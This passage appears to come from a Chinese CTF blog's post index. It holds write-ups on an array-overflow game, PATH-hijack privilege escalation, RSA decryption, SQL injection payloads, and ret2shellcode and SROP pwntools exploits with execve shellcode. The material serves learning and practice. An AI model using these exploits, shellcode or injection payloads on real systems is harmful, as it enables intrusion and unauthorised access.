[ebp-Ch]  int *v9; // [esp+A9Eh] [ebp-8h]  v9 = &amp;argc;  v8 = __readgsdword(0x14u);  init_player(v5);  init_map(v7, v5);  print_map(v7, v5);  signal(2, (__sighandler_t)sigint_handler);  do  &#123;    do    &#123;      v4 = getchar();      move_player(v5, v4, v7);      print_map(v7, v5);    &#125;    while ( v5[0] != 29 );  &#125;  while ( v5[1] != 89 );  puts(&quot;You win!&quot;);  if ( v6 )  &#123;    puts(&quot;flage&quot;);    win();    fflush(stdout);  &#125;  return 0;&#125;\n\n写博客重新复现的时候 决定把每个函数都过一遍 顺便加强我的代码审计能力\nint __cdecl init_player(int a1)&#123;  int result; // eax  *a1 = 4;  *(a1 + 4) = 4;  result = a1;  *(a1 + 8) = 0;  return result;&#125;\n\na1的地址等同于v5 v5这个数组就定义了两个元素  分别用来存放此时我们处于map上的位置\nElf32_Dyn **__cdecl init_map(int a1, _DWORD *a2)&#123;  Elf32_Dyn **result; // eax  int i; // [esp+8h] [ebp-Ch]  int j; // [esp+Ch] [ebp-8h]  result = &amp;GLOBAL_OFFSET_TABLE_;  for ( i = 0; i &lt;= 29; ++i )  &#123;    for ( j = 0; j &lt;= 89; ++j )    &#123;      if ( i == 29 &amp;&amp; j == 89 )      &#123;        *(a1 + 2699) = &#x27;X&#x27;;      &#125;      else if ( i == *a2 &amp;&amp; j == a2[1] )      &#123;        *(90 * i + a1 + j) = player_tile;      &#125;      else      &#123;        *(90 * i + a1 + j) = &#x27;.&#x27;;      &#125;    &#125;  &#125;  return result;&#125;\n\na1相当于v7 v7定义了非常大一串 用来开辟一块内存给地图的存放\n利用for循环对map进行了初始化 除了两个特殊的地方 用户的初始位置和终点 其他都为’.’\nint __cdecl print_map(int a1, int a2)&#123;  int i; // [esp+8h] [ebp-10h]  int j; // [esp+Ch] [ebp-Ch]  clear_screen();  find_player_pos(a1);  find_end_tile_pos(a1);  print_flag_status(a2);  for ( i = 0; i &lt;= 29; ++i )  &#123;    for ( j = 0; j &lt;= 89; ++j )      putchar(*(90 * i + a1 + j));    putchar(10);  &#125;  return fflush(stdout);&#125;\n\nfor循环遍历打印出map\n接下来用getchar赋值了v4 传入下面这个函数充当a2 \na1用来存储用户位置 a3则是存放map\n_BYTE *__cdecl move_player(_DWORD *a1, char a2, int a3)&#123;  _BYTE *result; // eax  if ( a2 == &#x27;l&#x27; )    player_tile = getchar();  if ( a2 == &#x27;p&#x27; )    solve_round(a3, a1);  *(a1[1] + a3 + 90 * *a1) = &#x27;.&#x27;;  switch ( a2 )  &#123;    case &#x27;w&#x27;:      --*a1;      break;    case &#x27;s&#x27;:      ++*a1;      break;    case &#x27;a&#x27;:      --a1[1];      break;    case &#x27;d&#x27;:      ++a1[1];      break;  &#125;  result = (a1[1] + a3 + 90 * *a1);  *result = player_tile;  return result;&#125;\n\n大体是利用’wsad’控制用户位置 不过存放两个特殊的指令\n‘l’可以把player_tile替换成其后面的字符\n‘p’则可以直接把用户位置移动到终点\n最后利用result存储用户位置移动后的地址 在对应地址存入player_tile\nif ( v6 )  &#123;    puts(&quot;flage&quot;);    win();    fflush(stdout);  &#125;\n\n最后回到main函数 如果到达了终点 则对v6进行判断 如果为真 就输出flag\n分析完了程序 来捋一捋思路 目的无非就是要修改到v6的值 不过程序不存在任意写也无法栈溢出覆盖到v6\n不过还是存在着一个细微的漏洞 可以做到数组溢出 如果我们使得v5中的元素值为负呢?\n也就是达到了map边界后仍然向边界外面移动 这个时候就会往非法内存处写入值\n这对于v6的值会有什么影响呢 我们知道 在栈结构不被破坏的情况下 固定索引到的栈地址存放的一定是v6\n那么我们只需要破坏栈结构 使其索引到的是其他值就行了\n\n这个时候我们来尝试一下 进行一下数组溢出 将位置移动到左上角后 再输入a\n\n\n可以看到此时栈的结构就成功被破坏了 不过此时我们仍然无法通过if\nbyte ptr的作用在于指明访问的内存单元是一个字节单元 也就是只读入一个字节的数据\n\n此时还是0 那么只需要利用同样的手法多试几次 最后成功获得flag\nVNE从来没做过这样的题目 说实话还是挺好玩的 感觉和awd有点像\n一开始没有给我们附件  启动靶机后 提示让我们进行ssh连接\n\n这里我使用的软件是finalshell\n\n连上了以后 照着提示下载了bin文件 是题目的附件\n保护全开 ida看一看\n\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v3; // rax  int v4; // ebx  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  const char *v8; // rax  __int64 v9; // rax  __int64 v10; // rax  char v12; // [rsp+3h] [rbp-6Dh] BYREF  unsigned int v13; // [rsp+4h] [rbp-6Ch]  char *v14; // [rsp+8h] [rbp-68h]  char v15[32]; // [rsp+10h] [rbp-60h] BYREF  char v16[40]; // [rsp+30h] [rbp-40h] BYREF  unsigned __int64 v17; // [rsp+58h] [rbp-18h]  v17 = __readfsqword(0x28u);  v14 = getenv(&quot;SECRET_DIR&quot;);  if ( v14 )  &#123;    v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Listing the content of &quot;);    v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v5, v14);    v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot; as root: &quot;);    std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    std::allocator&lt;char&gt;::allocator(&amp;v12);    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v16, v14, &amp;v12);    std::operator+&lt;char&gt;(v15, &quot;ls &quot;, v16);    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v16);    std::allocator&lt;char&gt;::~allocator(&amp;v12);    setgid(0);    setuid(0);    v8 = (const char *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::c_str(v15);    v13 = system(v8);    if ( v13 )    &#123;      v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, &quot;Error: system() call returned non-zero value: &quot;);      v10 = std::ostream::operator&lt;&lt;(v9, v13);      std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      v4 = 1;    &#125;    else    &#123;      v4 = 0;    &#125;    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v15);  &#125;  else  &#123;    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, &quot;Error: SECRET_DIR environment variable is not set&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v4 = 1;  &#125;  return v4;&#125;\n\n用c++编写的程序 结合直接运行大概能看懂主要流程 就是根据环境变量SECRET_DIR的值\n执行ls SECRET_DIR\n加上题目给的提示 所以这里把SECRET_DIR值设置为&#x2F;root&#x2F; 看看root目录下有什么东西\n\n我们的目标就是flag.txt了 当然由于权限问题 我们肯定不能直接cat\n\n这里学习了幽林师傅的思路 我们把&#x2F;bin目录里面的cat文件拷贝下来 上传到&#x2F;home&#x2F;ctf-player 目录中 顺便更改一下PATH 顺便更改cat文件名为ls\n这样在调用ls的时候 相当于调用的就是cat了\n然后再把SECRET_DIR更改为&#x2F;root&#x2F;flag.txt 就可以获取flag了\n\n不过不知道什么问题 使用finalshell执行最后一步的时候 会报如下错 所以我更换了windterm才解决问题\n\n","categories":["wp"]},{"title":"RSA","url":"/2023/03/27/RSA/","content":"RSA基本原理接触了半年ctf 现在才开始学rsa 233 倒也不为晚 刚好重新学逆向的时候遇到了rsa的题目 那就顺便来学习一下\nrsa的加密实际上就是由明文进行E次方后和N进行取模运算\n密文＝(明文^E)modN\n\n其中E和N被合称为公钥 记作 (E,N)\n而解密也可以看作和加密一样 由密文进行D次方后和N进行取模运算得到\n明文＝密文^DmodN\n\n相应的 D和N合称为私钥 记作 (D,N)\n密钥对则是公钥和私钥的合并 记作（E，D，N）\n密钥对的生成一共要经过四个步骤 其中还需要一个中间数 这里记作L\n依次是 求N 求L 求E 求D\n求N N实际上是由两个质数相乘得到 可以记作 N &#x3D; P*Q\n求L  L是q-1和p-1的最小公倍数 L&#x3D;lcm（p－1，q－1）\n求E  E比1大比L小 E和L的最大公约数为1 gcd（E，L）&#x3D;1\n求D  D要根据E来计算出来 E＊D mod L ＝ 1\n例题比如buu上的一题RSA 给了两个附件 一个存放密文 一个存放公钥\n去这个网站把公钥分解一下\nRSA公私钥分解 Exponent、Modulus，Rsa公私钥指数、系数(模数)分解–查错网 (chacuo.net)\n\n将模数转化为十进制后 就是N 指数则为E\nfactordb.com这个网站可以拆解N 得到pq\np= 285960468890451637935629440372639283459q= 304008741604601924494328155975272418463\n\n接着进行简单的脚本运算就可以得到明文\nimport gmpy2import rsae = 65537n = 86934482296048119190666062003494800588905656017203025617216654058378322103517p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463phin = (q-1)*(p-1)d = gmpy2.invert(e, phin)key = rsa.PrivateKey(n, e, int(d), p, q)with open(&quot;C:\\\\Users\\\\22346\\\\Desktop\\\\flag.enc&quot;, &quot;rb+&quot;) as f:    f = f.read()    print(rsa.decrypt(f, key))\n\n","categories":["reverse"]},{"title":"SQL","url":"/2023/03/28/SQL/","content":"[SWPUCTF 2021 新生赛]easy_sql&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;参数是 wllm&lt;/title&gt;&lt;style&gt;body&#123;background-image:url(&#x27;jiege.jfif&#x27;);&#125;&lt;/style&gt;&lt;/head&gt;球球你输入点东西吧！&lt;/html&gt;\n\n进去提示说让我们输入东西 并且参数是wllm\n直接输入1看看\nhttp://1.14.71.254:28357/?wllm=1\n\n\n有回显 随后要判断一下是什么类型的漏洞 在1后面加上’试试看\n出现报错 可以判断是字符型漏洞\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1\n\n接下来就是利用order by语句来判断字段列数\n具体可以看这里使用order by排序判断返回结果的列数，order by排序判断字段数原理详解_order by查找回显数_士别三日wyx的博客-CSDN博客\n?wllm=-1&#x27; order by 4--+\n\n当为4的时候报错 说明字段列数为3 接下来要判断一下哪些可以用来回显\n\nsql注入之select&#x2F;union select_select union select_一只躺平的猪的博客-CSDN博客\n?wllm=-1&#x27; union select 1,2,3--+\n\n\n2,3可以用来回显 接着要查询一下其所属的数据库  一开始想两个都查的 但是报错了 估计第二个字段列是用来查询的\n?wllm=-1&#x27; union select 1,detabase(),database()--+\n\n\n不过这里也知道了其数据库名是test_db 可以用3来查询一下验证猜测\n?wllm=-1&#x27; union select 1,2,database()--+\n\n\n接下来查一下test_db库的表\n?wllm=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;--+\n\n不理解的可以看看这个information_schema.columns字段说明，获取数据库表所有列信息_橙-极纪元的博客-CSDN博客\n【整理】mysql中information_schema.tables字段说明_boshuzhang的博客-CSDN博客\n\n查一下test_tb的字段\n?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27;--+\n\n\nflag出来了 那直接查flag内容\n?wllm=-1&#x27; union select 1,2,group_concat(flag) from test_tb--+\n\n\n[强网杯 2019]随便注这题主要是对几个关键词进行了限制 导致在获取flag字段内容的时候有点麻烦 其他的和上题差不多\n\n结合题目猜测是sql注入  \n1&#x27; or 1=1#\n\n\n然后看一看有几个字段\n1&#x27; order by 1#\n\n到3的时候报错 说明就两个字段\n\n原本是想用union select查询有回显的字段的 但是有关键词检测\n1&#x27; union select 1,2#\n\n\n这里学到了用分号执行不同的sql语句 以及show来爆数据库和表\n&#x27;; show databases#\n\n\n爆表\n&#x27;;show tables#\n\n\n分别爆一下两个表的字段\n&#x27;;show columns from words#\n\n\n接着是爆1919810931114514表的内容  数字要用反引号包起来\n&#x27;;show columns from `1919810931114514`#\n\n\n由于对select进行了关键词检测 这里的flag字段不好提取 采用转化成16进制后 再次转化回来并且执行\n先将\nselect * from `1919810931114514`\n\n进行16进制编码 再这样构造payload\n&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql#\n\nprepare execsql from @a进行了进制转化 随后execute execsql执行sql语句\n成功得到flag\n\n还有一种做法 这里也一并学习一下\n先把words表命名为其他\n然后把另外一个表命名为word\n随后给新的word表增加一个列\n并且修改一下flag的列名\n&#x27;;rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alter table words change flag data varchar(100);#\n\nalter\n作用：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）\n用法：\n添加一个列\nalter table &quot; table_name&quot; add &quot; column_name&quot;  type;\n\n删除一个列alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;\n\n改变列的数据类型alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;\n\n改列名alter table &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type;alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;\n\n\n","categories":["web"]},{"title":"Ret2shellcode","url":"/2022/09/21/Ret2shellcode/","content":"这次我们再来介绍一个栈的经典题型\n在我们先前遇到的题目中，都有着出题人为我们提供的后门函数，如果没有后门函数，我们又该如何自己构建shellcode呢？\n带着这个疑问，我们开始今天的学习\n如何写入system（&#x2F;bin&#x2F;sh）？由于题目通常都会开启NX保护，所以我们要想在栈中写入字符串是不现实的打算\n我们好好想想，在内存块的五个分区中，还有哪个区块是可以为我们自由编辑的，这里我们想到了用来存储未初始化的全局变量区bss段\n那么如何写入呢？\n我们先前已经知道了，计算机读不懂高级语言，即system(&#x2F;bin&#x2F;sh)\n先前我们已经通过构造rop的方式用汇编语言指引执行流\n这次我们尝试用机器码来将shellcode注入到内存中\n常用的shellcode：”\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05”\n这个shellcode只有23个字节，当题目的输入字长给的不够多的时候可以使用这个\n当然还有第二种构造机器码的方式\nshellcode &#x3D; asm(shellcraft.sh())\n但是你很快就会发现，为什么自己在32位情况下可以使用，但是64位下就不行\n我们还需要在后面加上amd64才能使其输出64位的机器码\n当然我们也可以通过**context.arch &#x3D; “amd64”**来使环境转化为64位，于是我们在接下来即使不用amd64也能输出64位机器码\n例题解析这里以NewStarCTF 2022新生赛公开赛 的ret2shellcode作为例题讲解\n\n老规矩看一下保护机制，NX开了，看来不能在栈上写入\nida看一下具体情况\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[40]; // [rsp+0h] [rbp-30h] BYREF  void *buf; // [rsp+28h] [rbp-8h]  init(argc, argv, envp);  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL);  puts(&quot;Hello my friend.Any gift for me?&quot;);  read(0, buf, 0x100uLL);  puts(&quot;Anything else?&quot;);  read(0, v4, 0x100uLL);  puts(&quot;Ok.See you!&quot;);  return 0;&#125;\n\n出现了个mmap函数，用来干什么的？\n可以简单理解为 开辟一块空间存放我们输入的值 其地址为第一个参数addr(0x233000)\n那么我们的目的就是将shellcode写入这块空间，然后在接下来的栈溢出中控制程序执行流到shellcode\nfrom pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25533)shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;io.recvuntil(&quot;Hello my friend.Any gift for me?&quot;)io.sendline(shellcode)io.recvuntil(&quot;Anything else?&quot;)payload = cyclic(56)+p64(0x233000)io.sendline(payload)io.recv()io.interactive()\n\n其实本质上还是栈溢出控制程序执行流到后门函数，只不过这个后门函数是我们自己存入到程序中的，还是挺好理解的\n","categories":["栈"]},{"title":"ROP","url":"/2022/09/17/ROP/","content":"动态链接和静态链接静态链接和动态链接的相关概念，我们在栈溢出篇曾粗略提到过\n我们说到，为了防止每次调用函数都需要将函数的libc库拷贝到文件中，加大文件的存储占用\n不如在程序运行时将动态库加载到内存中，多个程序运行只需要调用一份\n静态库特点：1.静态库对函数库的链接是放在编译时期完成的2.程序在运行时与函数库再无瓜葛，移植方便。3.浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件4.如果静态库进行更新则应用该库的所有程序都需要重新编译（全量更新）。\n动态库特点：1.动态库把对一些库函数的链接载入推迟到程序运行时期。2.可以实现进程之间的资源共享。（因此动态库也称为共享库）3.将一些程序升级变得简单。4.甚至可以真正做到链接载入完全由程序员在程序代码中控制（显示调用）\n还是不太清楚？我们这样来理解，我们在吃饭前需要备好碗筷\n如果我们每吃一道菜就要准备一副碗筷，这是静态库\n如果我们只用一副碗筷就吃完所有菜，这是动态库\nROP在明白了动态库和静态库的区别后，我们接着讲栈溢出的相关内容\n我们已经学过的栈溢出，需要函数中有着出题人给我们预先准备好的system函数和binsh字符串\n如果没有呢？我们又该从何入手\n在开始之前，我们先明白几个概念\n1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。\n2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。(涉及到接下来的栈变化情况，现在看不懂的没关系，接下来会图片演示详讲)\n3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax\n4.在linux系统中，函数的调用是有一个系统调用号的\n我们接下来详细介绍这个系统调用号\n系统调用号Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数\n而我们需要用到的system(&#x2F;bin&#x2F;sh)函数的系统调用号为11，也就是0xb\n他的系统调用规范是execve(“&#x2F;bin&#x2F;sh”, 0,0)\n那么我们如何向栈中传入这一串的数据来达到我们调用system的目的呢？\n计算机语言分为高级语言和低级语言\n我们先要知道，像c语言，python语言这样的，是属于高级语言\n高级语言指较接近自然语言和数学公式的编程，基本脱离了机器的硬件系统，用人们更易理解的方式编写程序\n低级语言包括机器语言(二进制语言)和汇编语言\n这两种语言都是面向机器的语言，和具体机器的指令系统密切相关\n所以我们输入的是system(&#x2F;bin&#x2F;sh)，但是实际上计算机他不能读懂这段代码是什么意思\n他要先进行编译，将其转化为自己能读懂的汇编语言\n所以system(&#x2F;bin&#x2F;sh)用汇编语言来表示也可以转化为\npop eax   系统调用号载入， execve为0xbpop ebx   第一个参数， /bin/sh的stringpop ecx    第二个参数，0pop edx   第三个参数，0int 0x80\n\n仔细思考一下，静态链接是将静态库在程序运行前就载入于文件中\n所以，我们有了思路，既然静态链接导致的后果是文件过于庞大，因为其加载了静态库\n所以我们可以在程序文件中搜索特定的汇编语言，将其一条条串连起来\n这里我觉得有必要再插入一段说明，关于这个串连\n我们是如何进行栈溢出的，实际上是覆盖ret addr来达到我们控制程序执行流的目的对吧\n所以我们只需要确保每一个汇编代码执行完了以后都有一个ret指令，我们就可以使程序执行流按照我们预想的方式来跳转\n那么我们又该如何寻找这些汇编代码呢？这里就用到了我们刚才提过的ropgadgets工具\nropgadgets我们在linux终端中输入\nROPgadget   -binary 文件名 --only&quot; 要搜索的 &quot; \n\n于是，我们得到了 pop eax&#x2F;ebx 的地址\n\n这里是是否还有一个疑问？欸他这里是连在一起的啊，就比如第一行pop eax和pop ebx是连在一起的怎么办？\n很简单，我们只需要同时传入他们各自所需要的参数即可\n我们再搜索ebx.ecx.edx 以及int 80h系统调用和bin&#x2F;sh\n\n\n\n到这里为止，我们就清楚了rop构造执行流的完整思路，接下来我们用一道例题来演示\nret2syscall我们先用checksec检查他开启了哪些保护机制以及查看他的位数\n\n打开了NX保护机制，我们无法在栈中读写数据，所以只能采用构造ROP执行流的办法\n再用ida打开看一下main函数写了什么\n\n可以看到gets函数，判断应该也是一个栈溢出题\n但是没有给我们提供system函数地址和字符串binsh地址\n所以我们这里利用ROP构造\n我们来查找pop eax等汇编代码的地址\n\n得到了地址之后，我们开始构造payload\n","categories":["栈"]},{"title":"SROP","url":"/2023/01/27/SROP/","content":"一种独特的rop手法 利用了64位Linux的系统调用号15的rt_sigreturn函数\nLinux系统中 信号实际上就是软中断 比如用户在终端输入了ctrl+c 就会终止终端 这时候就需要信号机制\n软中断在计组原理中有所提及 这里不重复说明\n每一个信号都有自己的名称和编号 对应着不同的功能 可以使用kill -l来查看\n\n而今天要利用的rt_sigreturn函数就是linux中多种信号的一个\nrt_sigreturn - 从信号处理函数返回，并清除栈帧\n当linux内核确定某进程还有一个未阻塞的信号待处理 当进程下一次从内核态切换到用户态时（比如进行系统调用后 或者是进程重新调度到cpu上）\n它会创建用户空间堆栈 或定义的备用堆栈上的一个栈帧 用于保存各种进程上下文\n\n如图所示 其中最关键的就是寄存器的值也会保存在栈上 借助这一点 我们可以很轻易的实现寄存器值的修改 从而实现系统调用\n这一段内存被称为Signal Frame\n下面来看一道例题 buuctf中的ciscn_2019_es_7\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n保护机制很常规 看一下ida\nsigned __int64 vuln()&#123;  signed __int64 v0; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_read(0, buf, 0x400uLL);  return sys_write(1u, buf, 0x30uLL);&#125;\n\nmain函数跳转到了vuln函数 \nvuln函数有栈溢出的机会 同时还给了write函数输出0x30字节的数据\n程序还给了gadget函数 伪代码看不出什么 看一下汇编\n.text:00000000004004D6                 public gadgets.text:00000000004004D6 gadgets         proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6                 push    rbp.text:00000000004004D7                 mov     rbp, rsp.text:00000000004004DA                 mov     rax, 0Fh.text:00000000004004E1                 retn.text:00000000004004E1 gadgets         endp ; sp-analysis failed.text:00000000004004E1\n\n有mov rax，0xf 显然这题就是要利用rt_sigreturn进行srop来实现system系统调用\n不过要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值binsh字符串的地址\n由于题目没有自带binsh 此时有两种办法 一种是泄露libc基址 我们自己计算 还有一种是把binsh写到栈上 然后利用write函数泄露栈地址\ngdb动调后发现泄露不到libc基址 所以这里用第二种办法 先gdb动调看一下哪里可以泄露栈地址\n\n我们输入的8字节的字母a位于0x7fffffffdeb0处 而0x7fffffffded0处有一个0x7fffffffdfc8的栈地址可以泄露\n我们可以计算偏移 得到栈上的地址\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,27954)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;vuln_addr = 0x4004EDpayload = cyclic(0x10)#+p64(vuln_addr)gdb.attach(io)io.sendline(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x118\n\n此时的stack_addr就是我们通过read函数输入的第一个字长的数据的地址 如果我们将其替换成binsh 那么就是binsh字符串的地址\n接下来就是伪造Signal Frame了 pwntools自带了库可以实现\nframe = SigreturnFrame()frame.rax = 59frame.rdi = stack_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addr\n\n完整exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,27954)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;vuln_addr = 0x4004EDpayload = cyclic(0x10)+p64(vuln_addr)io.sendline(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x118syscall_addr = 0x400517rax15_addr = 0x4004DAframe = SigreturnFrame()frame.rax = 59frame.rdi = stack_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrpayload = b&#x27;/bin/sh\\x00&#x27;+cyclic(0x8)+p64(rax15_addr)+p64(syscall_addr)+bytes(frame)io.sendline(payload)io.interactive()\n\n","categories":["栈"]},{"title":"SUCTF2019_signin","url":"/2022/11/20/SUCTF2019-signin/","content":"__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF  char v5[16]; // [rsp+10h] [rbp-490h] BYREF  char v6[16]; // [rsp+20h] [rbp-480h] BYREF  char v7[16]; // [rsp+30h] [rbp-470h] BYREF  char v8[112]; // [rsp+40h] [rbp-460h] BYREF  char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF  unsigned __int64 v10; // [rsp+498h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts(&quot;[sign in]&quot;);  printf(&quot;[input your flag]: &quot;);  __isoc99_scanf(&quot;%99s&quot;, v8);  sub_96A(v8, v9);  __gmpz_init_set_str(v7, &quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);  __gmpz_init_set_str(v6, v9, 16LL);  __gmpz_init_set_str(v4, &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;, 10LL);  __gmpz_init_set_str(v5, &quot;65537&quot;, 10LL);  __gmpz_powm(v6, v6, v5, v4);  if ( __gmpz_cmp(v6, v7) )    puts(&quot;GG!&quot;);  else    puts(&quot;TTTTTTTTTTql!&quot;);  return 0LL;&#125;\n\n这一题涉及到的知识点非常多 所以写进博客记录一下\n出现了不认识的系统函数  上网查阅一下其对应的作用\n__gmpz_init_set_str 其实就是 mpz_init_set_str int mpz_init_set_str (mpz_t rop, const char *str, int base) 函数：这三个参数分别是多精度整数变量，字符串，进制。 这个函数的作用就是将 str 字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存。.void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod) 函数：其实就是计算 base 的 exp 次方，并对 mod 取模，最后将结果写入 rop 中， 这个运算的过程和RSA的加密过程一样。.接下来就是__gmpz_cmp函数，看这个函数名就知道这是比较函数。mpz_cmp(b, c)； //b 大于 c，返回 1；b等于 c，返回 0；b 小于 c，返回-1*/\n\n随后跟进一下sub_96A函数 看一下他对v8这个字符串进行了什么样的处理\nsize_t __fastcall sub_96A(const char *a1, __int64 a2)&#123;  size_t result; // rax  int v3; // [rsp+18h] [rbp-18h]  int i; // [rsp+1Ch] [rbp-14h]  v3 = 0;  for ( i = 0; ; i += 2 )  &#123;    result = strlen(a1);    if ( v3 &gt;= result )      break;    *(a2 + i) = word_202010[a1[v3] &gt;&gt; 4];   //除以16    *(a2 + i + 1LL) = word_202010[a1[v3++] &amp; 0xF];   ///求余16  &#125;  return result;&#125;\n\nword_202010这个数组跟进一下 查看内容\n0123456789abcdef\n\na2是v9 即一个空的数组 用来存放运算完的v8\n看一下if的第一个语句 涉及到了&gt;&gt;右移运算符\n(5条消息) 关于C&#x2F;C++左移右移运算符的总结_pineapple-coder的博客-CSDN博客\n这其实就是一个转16进制的算法 将这两个十六进制数分开存储\n比如输入字符 ‘1’ ，它的整数是49，49除16的整数是3，余数是1，在word_202010下标中分别对应3和1，构成的31就是字符 ‘1’的ASCII的十六进制形式，只不过是分开的十六进制，3 1 共两个字节\n程序主体部分到这里已经了解清楚了 接下来就是逆向RSA加密\ne&#x3D;65537\n密文c&#x3D;0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\nn&#x3D;103461035900816914121390101299049044413950405173712170434161686539878160984549\n浅析RSA算法 - 知乎 (zhihu.com)\n首先我们需要分解出两个指数p q\n利用工具得到\np=282164587459512124844245113950593348271q=366669102002966856876605669837014229419\n\n随后计算私匙\n最后成功得到明文\nsuctf&#123;Pwn_@_hundred_years&#125;\n\n","categories":["reverse"]},{"title":"SWPUCTF 2021 新生赛","url":"/2022/11/20/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/","content":"这篇用来记录SWPUCTF 2021 新生赛web刷题记录\ngift_F12&lt;script language=&quot;javascript&quot;&gt;    function show_date_time() &#123;        flag = &quot;WLLMCTF&#123;We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft&#125;&quot;//flag is here        window.setTimeout(&quot;show_date_time()&quot;, 1000);        BirthDay = new Date(&quot;10/23/2021 00:00:00&quot;);        today = new Date();        timeold = (BirthDay.getTime() - today.getTime());        sectimeold = timeold / 1000        secondsold = Math.floor(sectimeold);        msPerDay = 24 * 60 * 60 * 1000        e_daysold = timeold / msPerDay        daysold = Math.floor(e_daysold);        e_hrsold = (e_daysold - daysold) * 24;        hrsold = Math.floor(e_hrsold);        e_minsold = (e_hrsold - hrsold) * 60;        minsold = Math.floor((e_hrsold - hrsold) * 60);        seconds = Math.floor((e_minsold - minsold) * 60);        span_dt_dt.innerHTML = 